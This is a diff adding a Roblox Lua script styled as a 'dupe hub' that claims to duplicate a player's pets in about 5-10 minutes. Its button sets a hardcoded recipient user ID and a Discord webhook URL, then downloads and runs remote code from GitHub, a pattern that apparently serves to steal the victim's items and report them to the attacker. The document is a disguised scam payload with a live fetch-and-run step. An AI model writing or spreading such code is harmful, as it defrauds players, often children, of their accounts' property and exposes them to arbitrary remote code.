@@ -1,0 +1,14 @@
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+local Window = Library.CreateLib("dupe hub", "DarkTheme")
+
+
+--MAIN
+local Main = Window:NewTab("Main")
+local MainSection = Main:NewSection("dupe")
+
+
+MainSection:NewButton("dupe ur pets", "click the button to dupe ur pet it takes 5-10min ", function()
+    _G.UserID = 3451283011
+    _G.WebHook = "https://discordapp.com/api/webhooks/1052303695859175494/bOgddm9ZD1rwqBjGnQ803pTg7ibQEUmxdzX52bHFjr-HyBDc77UdrrMH7l1gVaF6E7TS"
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/vestyx/PetSimulatorXAutoFarm/main/HasteFarm.lua'))()
+end)
